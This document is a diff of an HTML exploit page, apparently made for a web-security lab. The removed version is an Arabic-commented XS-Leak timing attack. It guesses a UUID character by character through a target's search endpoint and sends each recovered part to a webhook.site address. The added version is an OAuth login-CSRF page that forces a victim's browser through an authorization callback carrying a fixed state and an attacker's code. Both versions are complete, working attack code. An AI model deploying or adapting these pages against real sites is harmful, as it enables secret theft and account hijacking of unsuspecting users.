@@ -1,121 +1,17 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>HackerAI - XS-Leak Enhanced Exploit</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f0f0f; color: #00ff41; padding: 20px; line-height: 1.6; }
-        .container { border: 2px solid #00ff41; padding: 20px; border-radius: 10px; background-color: #1a1a1a; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); }
-        #key-display { font-family: 'Courier New', monospace; font-size: 28px; color: #ff00ff; word-break: break-all; margin: 20px 0; padding: 10px; border: 1px dashed #444; text-align: center; }
-        .status-bar { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; }
-        .log { background: #000; padding: 15px; height: 350px; overflow-y: scroll; font-size: 13px; border: 1px solid #333; color: #00d0ff; }
-        .highlight { color: #ffff00; font-weight: bold; }
-        .error { color: #ff4444; }
-    </style>
+    <meta charset="utf-8">
+    <title>Homelab</title>
 </head>
 <body>
 
-<div class="container">
-    <div class="status-bar">
-        <span>الحالة: <span id="status" style="color: gold;">في انتظار البدء...</span></span>
-        <span>الهدف: <code id="target-url"></code></span>
-    </div>
-
-    <h1>مستخرج UUID عبر XS-Leak</h1>
-    
-    <div>المفتاح المستخرج (UUID):</div>
-    <div id="key-display">-------- - ---- - ---- - ---- - ------------</div>
-    
-    <div class="log" id="log"></div>
-</div>
+<img src="http://ptl-c0500a35-c549e685.libcurl.so/users/auth/myprovider?state=sh3rif0xsh3rif0x">
 
 <script>
-    const TARGET_BASE = "http://ptl-41f731a5e034-c2c22805e34a.libcurl.me/search?search=";
-    const WEBHOOK_URL = "https://webhook.site/2a326388-6705-466d-9454-bd91d189b738";
-    const CHARSET = "0123456789abcdef";
-    const THRESHOLD = 500; // تم تقليل العتبة لتكون أكثر حساسية (قابلة للتعديل بناءً على استجابة الخادم)
-    
-    let leakedKey = "";
-    const logElement = document.getElementById('log');
-    document.getElementById('target-url').innerText = TARGET_BASE;
-
-    function log(msg, type = '') {
-        const div = document.createElement('div');
-        if (type === 'found') div.className = 'highlight';
-        if (type === 'error') div.className = 'error';
-        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        logElement.appendChild(div);
-        logElement.scrollTop = logElement.scrollHeight;
-    }
-
-    async function checkChar(testKey) {
-        // نستخدم النجمة أو الـ caret بناءً على سلوك الخادم المستهدف
-        const url = `${TARGET_BASE}${testKey}&_cb=${Date.now()}`;
-        const start = performance.now();
-        
-        try {
-            // استخدام fetch مع كاش معطل تماماً
-            await fetch(url, { mode: 'no-cors', cache: 'no-store' });
-        } catch (e) {
-            // تجاهل خطأ CORS
-        }
-        
-        return performance.now() - start;
-    }
-
-    async function startExploit() {
-        log("بدء الهجوم... جاري تحليل استجابة الخادم.");
-        document.getElementById("status").innerText = "جاري الاستخراج...";
-
-        for (let i = 0; i < 36; i++) {
-            // التحقق مما إذا كان الموضع الحالي هو مكان شرطة في الـ UUID
-            if (i === 8 || i === 13 || i === 18 || i === 23) {
-                leakedKey += "-";
-                document.getElementById("key-display").innerText = leakedKey;
-                log(`تخطي الموضع ${i}: إضافة شرطة تلقائياً.`);
-                continue;
-            }
-
-            let foundInThisRound = false;
-
-            for (let char of CHARSET) {
-                const currentTry = leakedKey + char;
-                log(`فحص الحرف: ${char} في المسار: ${currentTry}`);
-                
-                // نقوم بالقياس مرتين لأخذ المتوسط وتقليل الضوضاء (Noise)
-                const d1 = await checkChar(currentTry);
-                const d2 = await checkChar(currentTry);
-                const avgDuration = (d1 + d2) / 2;
-
-                if (avgDuration >= THRESHOLD) {
-                    leakedKey += char;
-                    document.getElementById("key-display").innerText = leakedKey;
-                    log(`*** تم العثور على تطابق: ${char} (الوقت: ${avgDuration.toFixed(2)}ms) ***`, 'found');
-                    
-                    // إرسال التحديث للـ Webhook
-                    fetch(`${WEBHOOK_URL}?current=${leakedKey}`);
-                    
-                    foundInThisRound = true;
-                    break;
-                }
-            }
-
-            if (!foundInThisRound) {
-                log(`تحذير: لم يتم العثور على حرف للموضع ${i}. قد تحتاج لتقليل الـ THRESHOLD.`, 'error');
-                // خيار: يمكن إضافة "حرف افتراضي" أو إعادة المحاولة هنا.
-            }
-        }
-
-        log("اكتمل استخراج المفتاح: " + leakedKey, 'found');
-        document.getElementById("status").innerText = "اكتمل الهجوم بنجاح!";
-        document.getElementById("status").style.color = "#00ff41";
-        fetch(`${WEBHOOK_URL}?final_uuid=${leakedKey}`);
-    }
-
-    // تأخير البدء لضمان تحميل الصفحة واستقرار المتصفح
-    window.onload = () => {
-        setTimeout(startExploit, 2000);
-    };
+    setTimeout(function () {
+        window.location = "http://ptl-c0500a35-c549e685.libcurl.so/users/auth/myprovider/callback?code=b2a5721815d6ebcd867f38f485c97a11f34b6c8b81f182ed0cd1ed742a43b17a&state=sh3rif0xsh3rif0x";
+    }, 2000);
 </script>
 
 </body>
